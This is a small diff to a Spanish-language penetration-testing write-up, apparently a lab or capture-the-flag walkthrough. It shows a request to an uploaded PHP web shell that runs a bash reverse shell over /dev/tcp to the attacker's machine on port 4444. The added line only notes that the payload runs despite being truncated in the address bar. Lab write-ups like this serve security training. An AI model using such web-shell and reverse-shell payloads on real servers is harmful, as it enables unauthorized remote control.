@@ -137,6 +137,7 @@ http://10.128.172.51/uploads/shell.php5?cmd=bash -c 'bash -i >& /dev/tcp/10.128.
 Este tipo de payload es ampliamente utilizado en pruebas de penetración y puede encontrarse en recursos como [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet).
 
 ![Reverse Shell Execution](img/RShell.png)
+(Debido a limitaciones de visualización, el payload completo no se aprecia en la barra de direcciones, pero se ejecuta correctamente.)
 
 Este comando instruye al servidor a iniciar una conexión hacia la máquina atacante en el puerto 4444, proporcionando una shell interactiva.
 
